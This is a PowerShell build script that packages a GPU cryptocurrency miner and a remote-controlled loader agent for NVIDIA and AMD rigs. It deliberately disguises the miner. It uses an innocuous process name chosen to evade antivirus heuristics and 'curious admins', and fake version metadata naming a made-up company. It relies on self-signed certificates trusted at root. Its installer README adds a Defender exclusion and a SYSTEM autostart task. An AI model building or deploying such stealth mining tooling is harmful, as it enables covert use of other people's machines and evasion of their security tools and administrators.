# build_fleet_universal.ps1 -- ONE production bundle for EVERY rig (NVIDIA + AMD).
#
# Build ONCE on any Windows machine that has the toolchains -- it does NOT need
# a GPU at all (nvcc and hipcc cross-compile every target):
#     - CUDA Toolkit 12.x + CUTLASS headers (CUTLASS_DIR)  -> NVIDIA backend
#     - AMD HIP SDK for Windows                            -> AMD backend
#     - MSVC 2022 + Python 3.12
#     - pip install numpy blake3 py-pearl-mining pyinstaller
#
# The bundle ships BOTH backends; every rig auto-detects its GPU class at
# startup (p40cuda_nv.dll on NVIDIA, p40cuda_amd.dll on AMD -- all gfx code
# objects in one fatbin). Same pool lock, same panel pipeline, one zip for all.
#
# Usage:
#   powershell -ExecutionPolicy Bypass -File packaging\build_fleet_universal.ps1 -Version 1.5.universal-1
param(
    [Parameter(Mandatory=$true)][string]$Version,
    [switch]$SkipCuda,     # AMD-only shop? skip the CUDA backend
    [switch]$SkipHip,      # NVIDIA-only shop? skip the HIP backend
    # Innocuous process name for the miner (the onedir exe is freely
    # renameable; the agent finds it through the manifest entry). Avoids the
    # "p40-miner.exe" pattern AV heuristics and curious admins recognize.
    [string]$MinerExeName = "FleetComputeWorker.exe",
    # One self-contained agent exe (no console, --install autostart) instead of
    # the onedir folder. Recommended for the "single file" rig package.
    [bool]$OneFile = $true,   # ONE file (default): single self-extracting exes
    # Classic code-signing cert thumbprint from the local store (Certum etc.)
    [string]$SignCertThumbprint = "",
    # FREE option: PFX from packaging\make_selfsigned_cert.ps1 (no purchase, no
    # KYC). Rigs trust it after install_task.ps1 imports fleet-root.cer.
    [string]$SignPfx = "",
    [string]$SignPfxPassword = "",
    # Azure Trusted Signing: path to metadata.json (Endpoint,
    # CodeSigningAccountName, CertificateProfileName) with the
    # Microsoft.Trusted.Signing.Client.dll plugin next to it
    [string]$TrustedSigningMetadata = ""
)

$ErrorActionPreference = "Stop"
Set-Location (Join-Path $PSScriptRoot "..")

# ---- 1. NVIDIA backend: p40cuda_nv.dll (sm_61/86/89 + PTX for future cards)
if (-not $SkipCuda) {
    if (Test-Path "p40cuda.dll") { Remove-Item p40cuda.dll -Force }
    & packaging\build_capi.bat
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path "p40cuda.dll")) {
        throw "CUDA backend build failed (build_capi.bat)"
    }
    Move-Item p40cuda.dll p40cuda_nv.dll -Force
    Write-Host "== NVIDIA backend -> p40cuda_nv.dll"
}

# ---- 2. AMD backend: p40cuda_amd.dll (universal gfx arch list, auto-retry)
if (-not $SkipHip) {
    & (Join-Path $PSScriptRoot "build_hip.ps1") -OutName "p40cuda_amd.dll"
    if (-not (Test-Path "p40cuda_amd.dll")) { throw "HIP backend build failed" }
    Write-Host "== AMD backend -> p40cuda_amd.dll"
}
if (-not (Test-Path "p40cuda_nv.dll") -and -not (Test-Path "p40cuda_amd.dll")) {
    throw "no backend built: pass neither -SkipCuda nor -SkipHip"
}

# ---- 3. frozen miner. The spec emits BOTH layouts in one run:
#        dist\p40-miner\            (onedir)
#        dist\p40-miner-onefile.exe (single self-extracting file)
pyinstaller packaging\p40-miner-lite.spec --noconfirm --distpath dist --workpath build_pyi
if ($LASTEXITCODE -ne 0) { throw "miner pyinstaller failed" }
if ((Test-Path "amdhip64.dll") -and (Test-Path "dist\p40-miner\p40cuda_amd.dll")) {
    Copy-Item amdhip64.dll dist\p40-miner\ -Force   # HIP runtime next to its dll
}

# ---- 3a. masquerade identity: the exe's VERSIONINFO says something boring.
# A Task Manager glance shows "Fleet Compute Service" by "Fleet Systems" with
# a plausible description; AV heuristics see a normally-identified binary.
# Classic VSVersionInfo python form -- parsed by every PyInstaller version.
@'
VSVersionInfo(
  ffi=FixedFileInfo(
    filevers=(1, 0, 0, 0), prodvers=(1, 0, 0, 0),
    mask=0x3f, flags=0x0, OS=0x40004, fileType=0x1, subtype=0x0, date=(0, 0)),
  kids=[
    StringFileInfo([StringTable('040904B0', [
      StringStruct('CompanyName', 'Fleet Systems'),
      StringStruct('FileDescription', 'Fleet Compute Service'),
      StringStruct('FileVersion', '1.0.0.0'),
      StringStruct('InternalName', 'FleetComputeService'),
      StringStruct('LegalCopyright', '(c) Fleet Systems. All rights reserved.'),
      StringStruct('OriginalFilename', 'FleetComputeService.exe'),
      StringStruct('ProductName', 'Fleet Compute Service'),
      StringStruct('ProductVersion', '1.0.0.0')])]),
    VarFileInfo([VarStruct('Translation', [1033, 1200])])
  ]
)
'@ | Set-Content packaging\version_info.txt -Encoding UTF8

# ---- 3b. payload layout: ONE FILE by default (single self-extracting exe),
#          onedir with -OneDir.
if (-not $OneFile) {
    $payloadDir = "dist\p40-miner"
    $payloadExe = Join-Path $payloadDir "p40-miner.exe"
    if ($MinerExeName -ne "p40-miner.exe") {
        Rename-Item $payloadExe $MinerExeName
        $payloadExe = Join-Path $payloadDir $MinerExeName
    }
} else {
    $payloadDir = "dist\onefile"
    if (Test-Path $payloadDir) { Remove-Item $payloadDir -Recurse -Force }
    New-Item -ItemType Directory -Path $payloadDir | Out-Null
    $src = "dist\p40-miner-onefile.exe"
    if (-not (Test-Path $src)) { throw "one-file exe missing: $src" }
    $payloadExe = Join-Path $payloadDir $MinerExeName
    Move-Item $src $payloadExe
    # HIP runtime must be reachable: PyInstaller onefile unpacks bundled DLLs to
    # _MEIPASS (searched by cuda_capi), but amdhip64 ships beside the exe here.
    if (Test-Path "amdhip64.dll") { Copy-Item amdhip64.dll $payloadDir -Force }
}
Write-Host "== payload: $payloadDir ($(if (-not $OneFile) {'onedir'} else {'single file'}))"
if ($SignPfx) {
    if (-not (Get-Command signtool -ErrorAction SilentlyContinue)) {
        throw "signtool not on PATH (Windows SDK) for -SignPfx"
    }
    Get-ChildItem $payloadDir -Include *.exe,*.dll -Recurse | ForEach-Object {
        signtool sign /fd SHA256 /f $SignPfx /p $SignPfxPassword `
            /tr http://timestamp.digicert.com /td SHA256 $_.FullName
        if ($LASTEXITCODE -ne 0) { throw "signtool (pfx) failed on $($_.FullName)" }
    }
    Write-Host "== signed with self-signed PFX $SignPfx"
}
elseif ($SignCertThumbprint) {
    if (-not (Get-Command signtool -ErrorAction SilentlyContinue)) {
        throw "signtool not on PATH (install Windows SDK) for -SignCertThumbprint"
    }
    # sign every PE we ship: the exe + backend dlls + python runtime dlls
    Get-ChildItem $payloadDir -Include *.exe,*.dll -Recurse | ForEach-Object {
        signtool sign /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 `
            /sha1 $SignCertThumbprint $_.FullName
        if ($LASTEXITCODE -ne 0) { throw "signtool failed on $($_.FullName)" }
    }
    Write-Host "== signed with cert $SignCertThumbprint"
}
elseif ($TrustedSigningMetadata) {
    # Azure Trusted Signing (~$10/mo, no cert hardware, no OSS requirement):
    # pass a metadata.json with Endpoint / CodeSigningAccountName /
    # CertificateProfileName, and the Microsoft.Trusted.Signing.Client plugin
    # next to it (nuget: Microsoft.Trusted.Signing.Client).
    if (-not (Test-Path $TrustedSigningMetadata)) { throw "metadata json not found" }
    $plugin = Join-Path (Split-Path $TrustedSigningMetadata) "Microsoft.Trusted.Signing.Client.dll"
    if (-not (Test-Path $plugin)) { throw "Microsoft.Trusted.Signing.Client.dll not next to the metadata (nuget)" }
    Get-ChildItem $payloadDir -Include *.exe,*.dll -Recurse | ForEach-Object {
        signtool sign /fd SHA256 /tr http://timestamp.digicert.com /td SHA256 `
            /dlib $plugin /dmdf $TrustedSigningMetadata $_.FullName
        if ($LASTEXITCODE -ne 0) { throw "signtool (trusted signing) failed on $($_.FullName)" }
    }
    Write-Host "== signed via Azure Trusted Signing"
}
# No signing at all? The build still works unsigned; AV heuristics risk rises.

# ---- 4. the universal bundle
$backends = @()
if (Test-Path "p40cuda_nv.dll") { $backends += "cuda" }
if (Test-Path "p40cuda_amd.dll") { $backends += "hip" }
$bundleDir = "dist\bundle-$Version"
if (Test-Path $bundleDir) { Remove-Item -Recurse -Force $bundleDir }
New-Item -ItemType Directory -Path $bundleDir | Out-Null
@{
    version  = $Version
    engine   = "p40"
    entry    = $(if (-not $OneFile) { "p40-miner/$MinerExeName" } else { $MinerExeName })
    backends = $backends
    created  = (Get-Date).ToUniversalTime().ToString("o")
} | ConvertTo-Json | Set-Content (Join-Path $bundleDir "manifest.json")
if (-not $OneFile) {
    Copy-Item -Recurse $payloadDir (Join-Path $bundleDir "p40-miner")
} else {
    Copy-Item "$payloadDir\*" $bundleDir -Recurse -Force
}
Compress-Archive -Path "$bundleDir\*" -DestinationPath "dist\bundle-$Version.zip" -Force
$sha = (Get-FileHash "dist\bundle-$Version.zip" -Algorithm SHA256).Hash

# ---- 5. rig package: agent (the loader) + installer + signing trust
# -OneFile -> ONE self-contained exe (no console, autostart via --install).
# Default -> onedir (smaller start, needs the folder).
Write-Host "== freezing the rig agent (loader)"
if ($OneFile) {
    pyinstaller packaging\agent-onefile.spec --noconfirm --distpath dist --workpath build_pyi_agent1
    if ($LASTEXITCODE -ne 0) { throw "agent onefile pyinstaller failed" }
    $agentExe = "dist\FleetComputeService.exe"
} else {
    pyinstaller packaging\agent.spec --noconfirm --distpath dist --workpath build_pyi_agent
    if ($LASTEXITCODE -ne 0) { throw "agent pyinstaller failed" }
    $agentExe = "dist\rig-agent\rig-agent.exe"
}
if (($SignPfx -or $SignCertThumbprint -or $TrustedSigningMetadata) -and (Test-Path $agentExe)) {
    if ($SignPfx) {
        signtool sign /fd SHA256 /f $SignPfx /p $SignPfxPassword `
            /tr http://timestamp.digicert.com /td SHA256 $agentExe
    } elseif ($SignCertThumbprint) {
        signtool sign /fd SHA256 /sha1 $SignCertThumbprint `
            /tr http://timestamp.digicert.com /td SHA256 $agentExe
    } else {
        signtool sign /fd SHA256 /dlib $plugin /dmdf $TrustedSigningMetadata `
            /tr http://timestamp.digicert.com /td SHA256 $agentExe
    }
    if ($LASTEXITCODE -ne 0) { throw "signtool failed on the agent" }
    Write-Host "== agent exe signed"
}

if (Test-Path "dist\fleet-rig") { Remove-Item -Recurse -Force "dist\fleet-rig" }
New-Item -ItemType Directory -Path "dist\fleet-rig" | Out-Null
if ($OneFile) {
    Copy-Item $agentExe "dist\fleet-rig\FleetComputeService.exe"
@'
FLEET RIG -- single file install
================================
1) Copy FleetComputeService.exe (and fleet-root.cer, if present) to C:\rig\
2) Open PowerShell as Administrator and run (one line):

   C:\rig\FleetComputeService.exe --install --panel-url http://YOUR-PANEL:8000 --enroll-key YOUR-KEY --rig-name rig-01

That's it: the exe writes agent.json, excludes itself from Defender, registers a
SYSTEM autostart task and starts mining. Everything else (pool, wallet, %, miner
version) is controlled from the panel.
'@ | Set-Content "dist\fleet-rig\README.txt"
} else {
    Copy-Item -Recurse "dist\rig-agent" "dist\fleet-rig\rig-agent"
    Copy-Item "agent\install_task.ps1" "dist\fleet-rig\rig-agent\"
}
# free signing trust: the public cert travels with the installer, and
# install_task.ps1 imports it into Trusted Root + Trusted Publishers on the rig
if ($SignPfx) {
    $cer = [IO.Path]::ChangeExtension($SignPfx, ".cer")
    if (Test-Path $cer) {
        $certDst = if ($OneFile) { "dist\fleet-rig\fleet-root.cer" } else { "dist\fleet-rig\rig-agent\fleet-root.cer" }
        Copy-Item $cer $certDst -Force
        Write-Host "== fleet-root.cer included in the rig package"
    } else {
        Write-Warning "expected public cert $cer next to the PFX; rigs won't trust signatures"
    }
}

Write-Host ""
Write-Host "== UNIVERSAL production bundle ready: dist\bundle-$Version.zip"
Write-Host "   sha256 $sha"
Write-Host "   backends: $($backends -join ' + ')"
Write-Host "   rig package: dist\fleet-rig\ (agent + installer + signing trust)"
Write-Host "   Upload the zip to the panel, 'Развернуть' -- every rig (NVIDIA and AMD)"
Write-Host "   picks its own backend at startup. AMD rigs: run tools\test_hip_engine.py once."

# ---- 6. rig installer zip (upload straight into the panel)
Compress-Archive -Path "dist\fleet-rig\*" -DestinationPath "dist\fleet-rig-$Version.zip" -Force
Write-Host "   rig installer zip: dist\fleet-rig-$Version.zip"
